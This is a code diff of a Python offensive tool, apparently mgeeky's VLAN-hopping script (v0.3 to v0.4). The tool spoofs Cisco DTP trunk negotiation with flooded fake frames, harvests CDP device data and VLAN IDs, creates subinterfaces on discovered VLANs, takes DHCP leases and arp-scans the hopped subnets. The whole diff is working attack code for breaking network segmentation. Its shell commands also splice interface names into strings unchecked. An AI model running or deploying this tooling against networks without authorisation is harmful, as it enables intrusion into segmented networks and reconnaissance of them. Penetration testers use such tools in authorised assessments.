@@ -3,12 +3,18 @@
 #
 # This script is performing DTP Trunk mode detection and VLAN Hopping
 # attack automatically, running sniffer afterwards to collect any other
-# VLAN available. To be launched only in Unix/Linux environment as the 
-# script utilizes following applications:
+# VLAN available. 
+#
+# To be launched only in Unix/Linux environment as the script utilizes 
+# following applications:
 #   - 8021q.ko
 #   - vconfig
 #   - ifconfig / ip / route
 #   - dhclient
+#   - (optional) arp-scan
+#
+# Python requirements:
+#   - scapy
 #
 # NOTICE: 
 #   This program uses code written by 'floodlight', which comes from here:
@@ -16,15 +22,19 @@
 #
 # TODO:
 #   - Add logic that falls back to static IP address setup when DHCP fails
-#   - Possibly implement custom ARP/ICMP/DHCP spoofers
+#   - Possibly implement custom ARP/ICMP/DHCP spoofers or launch ettercap
+#   - Add auto-packets capture functionality via tshark/tcpdump to specified out directory
+#   - Add functionality to auto-scan via arp-scan desired network
 #
-# Mariusz B. / mgeeky, '18
+# Mariusz B. / mgeeky, '18, <mb@binary-offensive.com>
 #
 
 import os
+import re
 import sys
 import socket
 import struct
+import textwrap
 import argparse
 import tempfile
 import commands
@@ -41,7 +51,7 @@ except ImportError:
     sys.exit(1)
 
 
-VERSION = '0.3'
+VERSION = '0.4'
 
 config = {
     'verbose' : False,  
@@ -58,12 +68,16 @@ config = {
     'exitcommands' : [],
 }
 
+arpScanAvailable = False
 stopThreads = False
 attackEngaged = False
 dot1qSnifferStarted = False
 
-vlansHijacked = set()
+vlansDiscovered = set()
+vlansHopped = set()
+vlansLeases = {}
 subinterfaces = set()
+cdpsCollected = set()
 
 tempfiles = []
 
@@ -233,6 +247,10 @@ def inspectPacket(dtp):
         Logger.ok('DTP enabled, Switchport in Dynamic Auto configuration')
         print('[+] VLAN Hopping is possible.')
 
+    elif stat == 0x83:
+        Logger.ok('DTP enabled, Switchport in Trunk/Desirable configuration')
+        print('[+] VLAN Hopping is possible.')
+
     elif stat == 0x81:
         Logger.ok('DTP enabled, Switchport in Trunk configuration')
         print('[+] VLAN Hopping IS possible.')
@@ -244,9 +262,13 @@ def inspectPacket(dtp):
     elif stat == 0x42:
         Logger.info('DTP enabled, Switchport in Trunk with ISL encapsulation forced configuration')
         print('[?] VLAN Hopping may be possible.')
+    else:
+        Logger.info('Unknown DTP packet.')
+        Logger.dbg(dtp.show())
+        ret = False
 
     if ret:
-        print('[>] After Hopping to other VLANs - leave this program running to maintain connections.')
+        print('\n[>] After Hopping to other VLANs - leave this program running to maintain connections.')
 
     return ret
 
@@ -284,7 +306,7 @@ def engageDot1qSniffer():
 
     dot1qSnifferStarted = True
 
-    Logger.info('Starting VLAN/802.1Q sniffer.')
+    #Logger.info('Started VLAN/802.1Q sniffer.')
 
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
     sock.bind((config['interface'], ETH_P_ALL))
@@ -298,9 +320,9 @@ def engageDot1qSniffer():
 
         if pkt.haslayer(Dot1Q):
             dot1q = pkt.vlan
-            if dot1q not in vlansHijacked:
+            if dot1q not in vlansDiscovered:
                 print('==> VLAN discovered: {}'.format(dot1q))
-                vlansHijacked.add(dot1q)
+                vlansDiscovered.add(dot1q)
 
                 if not config['analyse']:
                     t = threading.Thread(target = addVlanIface, args = (dot1q, ))
@@ -325,8 +347,8 @@ def processDtps(dtps):
                     break
 
         if success:
-            Logger.ok('VLAN Hopping via Switch Spoofing may be possible.')
-            Logger.ok('Flooding with fake Access/Desirable DTP frames...\n')
+            #Logger.ok('VLAN Hopping via Switch Spoofing may be possible.')
+            Logger.dbg('Flooding with fake Access/Desirable DTP frames...\n')
 
             t = threading.Thread(target = floodTrunkingRequests)
             t.daemon = True
@@ -349,7 +371,7 @@ def processDtps(dtps):
     if attackEngaged:
         engageDot1qSniffer()
             
-def launchCommand(subif, cmd):
+def launchCommand(subif, cmd, forceOut = False, noCmd = False):
     # following placeholders in command: 
     # $GW (gateway), 
     # $MASK (full mask), 
@@ -362,17 +384,28 @@ def launchCommand(subif, cmd):
     if '%NET'   in cmd: cmd = cmd.replace('%NET', shell("route -n | grep " + subif + " | grep -v UG | awk '{print $1}' | head -1"))
     if '%MASK'  in cmd: cmd = cmd.replace('%MASK', shell("route -n | grep " + subif + " | grep -v UG | awk '{print $3}' | head -1"))
     if '%GW'    in cmd: cmd = cmd.replace('%GW', shell("route -n | grep " + subif + " | grep UG | awk '{print $2}' | head -1"))
-    if '%CIDR'  in cmd: cmd = cmd.replace('%CIDR', '/' + shell("ip addr show " + subif + " | grep inet | awk '{print $2}' | cut -d/ -f2"))
+    if '%CIDR'  in cmd: cmd = cmd.replace('%CIDR', '/' + shell("ip addr show " + subif + " | grep 'inet ' | awk '{print $2}' | cut -d/ -f2"))
 
-    print('[>] Launching command: "{}"'.format(cmd))
-    shell(cmd)
+    cmd = cmd.strip()
 
-def launchCommands(subif, commands):
+    if not noCmd:
+        print('[>] Launching command: "{}"'.format(cmd))
+    out = shell(cmd)
+
+    if forceOut:
+        print('\n' + '.' * 50)
+        print(out)
+        print('.' * 50 + '\n')
+    else:
+        Logger.info(out)
+
+def launchCommands(subif, commands, forceOut = False, noCmd = False):
     for cmd in commands:
-        launchCommand(subif, cmd)
+        launchCommand(subif, cmd, forceOut, noCmd)
 
 def addVlanIface(vlan):
     global subinterfaces
+    global vlansLeases
     global tempfiles
 
     subif = '{}.{}'.format(config['interface'], vlan)
@@ -381,7 +414,7 @@ def addVlanIface(vlan):
         Logger.fail('Already created that subinterface: {}'.format(subif))
         return
 
-    Logger.info('Creating new VLAN Subinterface for {}.'.format(vlan))
+    Logger.dbg('Creating new VLAN Subinterface for {}.'.format(vlan))
 
     out = shell('vconfig add {} {}'.format(
         config['interface'], vlan
@@ -399,7 +432,7 @@ def addVlanIface(vlan):
         Logger.dbg('So far so good, subinterface {} added.'.format(subif))
 
         ret = False
-        for attempt in range(3):
+        for attempt in range(2):
             Logger.dbg('Acquiring DHCP lease for {}'.format(subif))
             
             shell('dhclient -lf {} -pf {} -r {}'.format(dbFile, pidFile, subif))
@@ -415,39 +448,149 @@ def addVlanIface(vlan):
             ip = getIfaceIP(subif)
 
             if ip:
-                Logger.dbg('Subinterface has IP: {}'.format(ip))
+                Logger.dbg('Subinterface obtained IP: {}'.format(ip))
                 ret = True
 
-                print('[+] Hopped to VLAN {}.: {}'.format(vlan, ip))
+                vlansHopped.add(vlan)
+                vlansLeases[vlan] = (
+                    ip,
+                    shell("route -n | grep " + subif + " | grep -v UG | awk '{print $1}' | head -1"),
+                    shell("ip addr show " + subif + " | grep 'inet ' | awk '{print $2}' | cut -d/ -f2")
+                )
+
+                print('[+] Hopped to VLAN {}.: {}, subnet: {}/{}'.format(
+                    vlan, 
+                    vlansLeases[vlan][0], 
+                    vlansLeases[vlan][1], 
+                    vlansLeases[vlan][2] 
+                ))
+
                 launchCommands(subif, config['commands'])
+
+                if arpScanAvailable:
+                    Logger.info('ARP Scanning connected subnet.')
+                    print('[>] Other hosts in hopped subnet:    ')
+                    launchCommand(subif, "arp-scan -x -g --vlan={} -I %IFACE %NET%CIDR".format(vlan), True, True)
                 break
+            else:
+                Logger.dbg('Subinterface {} did not receive DHCPOFFER.'.format(
+                    subif
+                ))
 
             time.sleep(5)
 
         if not ret:
-            Logger.fail('Could not acquire DHCP lease for: {}'.format(subif))
-            Logger.fail('Skipping...')
+            Logger.fail('Could not acquire DHCP lease for: {}. Skipping.'.format(subif))
 
     else:
         Logger.fail('Failed.: "{}"'.format(out))
 
+def addVlansFromCdp(vlans):
+    while not attackEngaged:
+        time.sleep(3)
+        if stopThreads: 
+            return
+
+    for vlan in vlans:
+        Logger.info('Trying to hop to VLAN discovered in CDP packet: {}'.format(
+            vlan
+        ))
+        t = threading.Thread(target = addVlanIface, args = (vlan, ))
+        t.daemon = True
+        t.start()
+        vlansDiscovered.add(vlan)
+
+def processCdp(pkt):
+    global cdpsCollected
+    global vlansDiscovered
+
+    if not Dot3 in pkt or not pkt.dst == '01:00:0c:cc:cc:cc':
+        return
+
+    if not hasattr(pkt, 'msg'):
+        return
+
+    tlvs = {
+        1: 'Device Hostname',
+        2: 'Addresses',
+        3: 'Port ID',
+        4: 'Capabilities',
+        5: 'Software Version',
+        6: 'Software Platform',
+        9: 'VTP Management Domain',
+        10:'Native VLAN',
+        14:'VoIP VLAN',
+        22:'Management Address',
+    }
+
+    vlans = set()
+
+    out = ''
+    for tlv in pkt.msg:
+        if tlv.type in tlvs.keys():
+            fmt = ''
+            key = '    {}:'.format(tlvs[tlv.type])
+            key = key.ljust(25)
+            if hasattr(tlv, 'val'): fmt = tlv.val
+            elif hasattr(tlv, 'iface'): fmt = tlv.iface
+            elif hasattr(tlv, 'cap'): 
+                caps = []
+                if tlv.cap & (2**0) != 0: caps.append("Router")
+                if tlv.cap & (2**1) != 0: caps.append("TransparentBridge")
+                if tlv.cap & (2**2) != 0: caps.append("SourceRouteBridge")
+                if tlv.cap & (2**3) != 0: caps.append("Switch")
+                if tlv.cap & (2**4) != 0: caps.append("Host")
+                if tlv.cap & (2**5) != 0: caps.append("IGMPCapable")
+                if tlv.cap & (2**6) != 0: caps.append("Repeater")
+                fmt = '+'.join(caps)
+            elif hasattr(tlv, 'vlan'): 
+                fmt = str(tlv.vlan)
+                vlans.add(tlv.vlan)
+            elif hasattr(tlv, 'addr'):
+                for i in range(tlv.naddr):
+                    addr = tlv.addr[i].addr
+                    fmt += '{}, '.format(addr)
+
+            wrapper = textwrap.TextWrapper(
+                initial_indent = key, 
+                width = 80,
+                subsequent_indent = ' ' * len(key)
+            )
+            out += '{}\n'.format(wrapper.fill(fmt))
+
+    out = re.sub(r'(?:\n)+', '\n', out)
+
+    if not out in cdpsCollected:
+        cdpsCollected.add(out)
+        print('\n[+] Discovered new CDP aware device:\n{}'.format(out))
+
+        if not config['analyse']:
+            t = threading.Thread(target = addVlansFromCdp, args = (vlans, ))
+            t.daemon = True
+            t.start()
+        else:
+            Logger.info('Analysis mode: Did not go any further.')
+
 def packetCallback(pkt):
     Logger.dbg('RECV: ' + pkt.summary())
 
-def sniffThread():
-    global vlansHijacked
+    if Dot3 in pkt and pkt.dst == '01:00:0c:cc:cc:cc':
+        processCdp(pkt)
 
+def sniffThread():
+    global vlansDiscovered
     warnOnce = False
 
-    Logger.info('Sniffing for DTP frames (Max count: {}, Max timeout: {} seconds)...'.format(
+    Logger.info('Sniffing for CDP/DTP frames (Max count: {}, Max timeout: {} seconds)...'.format(
         config['count'], config['timeout']
     ))
 
     while not stopThreads and not attackEngaged:
+        dtps = []
         try:
             dtps = sniff(
                 count = config['count'], 
-                filter = 'ether[20:2] == 0x2004',
+                filter = 'ether[20:2] == 0x2004 or ether[20:2] == 0x2000',
                 timeout = config['timeout'],
                 prn = packetCallback,
                 stop_filter = lambda x: x.haslayer(DTP) or stopThreads,
@@ -462,12 +605,12 @@ def sniffThread():
             Logger.fail('It seems like there was no DTP frames transmitted.')
             Logger.fail('VLAN Hopping may not be possible (unless Switch is in Non-negotiate state):')
             Logger.info('\tSWITCH(config-if)# switchport nonnegotiate\t/ or / ')
-            Logger.info('\tSWITCH(config-if)# switchport mode access')
+            Logger.info('\tSWITCH(config-if)# switchport mode access\n')
             warnOnce = True
 
         if len(dtps) > 0 or config['force']:
             if len(dtps) > 0:
-                Logger.info('Got {} DTP frames.\n'.format(
+                Logger.dbg('Got {} DTP frames.\n'.format(
                     len(dtps)
                 ))
             else:
@@ -485,13 +628,13 @@ def getHwAddr(ifname):
     return ':'.join(['%02x' % ord(char) for char in info[18:24]])
 
 def getIfaceIP(iface):
-    out = shell("ip addr show " + iface + " | grep inet | awk '{print $2}' | head -1 | cut -d/ -f1")
+    out = shell("ip addr show " + iface + " | grep 'inet ' | awk '{print $2}' | head -1 | cut -d/ -f1")
     Logger.dbg('Interface: {} has IP: {}'.format(iface, out))
     return out
 
 def changeMacAddress(iface, mac):
     old = getHwAddr(iface)
-    Logger.dbg('Changing MAC address of interface {}, from: {} to: {}'.format(
+    print('[>] Changing MAC address of interface {}, from: {} to: {}'.format(
         iface, old, mac
     ))
     shell('ifconfig {} down'.format(iface))
@@ -559,7 +702,7 @@ def parseOptions(argv):
     print('''
         :: VLAN Hopping via DTP Trunk negotiation 
         Performs VLAN Hopping via negotiated DTP Trunk / Switch Spoofing technique
-        Mariusz B. / mgeeky, '18
+        Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
         v{}
 '''.format(VERSION))
 
@@ -568,6 +711,7 @@ def parseOptions(argv):
     parser.add_argument('-e', '--execute', dest='command', metavar='CMD', default=[], action='append', help='Launch specified command after hopping to new VLAN. One can use one of following placeholders in command: %%IFACE (choosen interface), %%IP (acquired IP), %%NET (net address), %%HWADDR (MAC), %%GW (gateway), %%MASK (full mask), %%CIDR (short mask). For instance: -e "arp-scan -I %%IFACE %%NET%%CIDR". May be repeated for more commands. The command will be launched SYNCHRONOUSLY, meaning - one have to append "&" at the end to make the script go along.')
     parser.add_argument('-E', '--exit-execute', dest='exitcommand', metavar='CMD', default=[], action='append', help='Launch specified command at the end of this script (during cleanup phase).')
     parser.add_argument('-m', '--mac-address', metavar='HWADDR', dest='mac', default='', help='Changes MAC address of the interface before and after attack.')
+    #parser.add_argument('-O', '--outdir', metavar='DIR', dest='outdir', default='', help='If set, enables packet capture on interface connected to VLAN Hopped network and stores in specified output directory *.pcap files.')
     parser.add_argument('-f', '--force', action='store_true', help='Attempt VLAN Hopping even if DTP was not detected (like in Nonegotiate situation).')
     parser.add_argument('-a', '--analyse', action='store_true', help='Analyse mode: do not create subinterfaces, don\'t ask for DHCP leases.')
     parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')
@@ -588,9 +732,44 @@ def parseOptions(argv):
 
     return args
 
+def printStats():
+    print('\n' + '-' * 80)
+    print('\tSTATISTICS\n')
+
+    print('[VLANS HOPPED]')
+    if len(vlansHopped):
+        print('Successfully hopped (and got DHCP lease) to following VLANs ({}):'.format(
+            len(vlansHopped)
+        ))
+        for vlan, net in vlansLeases.items():
+            print('- VLAN {}: {}, subnet: {}/{}'.format(vlan, net[0], net[1], net[2] ))
+    else:
+        print('Did not hop into any VLAN.')
+
+    print('\n[VLANS DISCOVERED]')
+    if len(vlansDiscovered):
+        print('Discovered following VLANs ({}):'.format(
+            len(vlansDiscovered)
+        ))
+        for vlan in vlansDiscovered:
+            print('- VLAN {}'.format(vlan))
+    else:
+        print('No VLANs discovered.')
+
+    print('\n[CDP DEVICES]')
+    if len(cdpsCollected):
+        print('Discovered following CDP aware devices ({}):'.format(
+            len(cdpsCollected)
+        ))
+        for dev in cdpsCollected:
+            print(dev + '\n')
+    else:
+        print('No CDP aware devices discovered.')
+
 def main(argv):
     global config
     global stopThreads
+    global arpScanAvailable
 
     opts = parseOptions(argv)
     if not opts:
@@ -602,6 +781,7 @@ def main(argv):
         return False
 
     load_contrib('dtp')
+    load_contrib('cdp')
 
     if not assure8021qCapabilities():
         Logger.err('Unable to proceed.')
@@ -638,6 +818,11 @@ def main(argv):
             Logger.err('Could not change interface\'s MAC address!')
             return False
 
+    if shell("which arp-scan") != '':
+        arpScanAvailable = True
+    else:
+        Logger.err('arp-scan not available: will not perform scanning after hopping.')
+
     t = threading.Thread(target = sniffThread)
     t.daemon = True
     t.start()
@@ -652,6 +837,8 @@ def main(argv):
     time.sleep(3)
 
     cleanup()
+
+    printStats()
     return True
 
 if __name__ == '__main__':
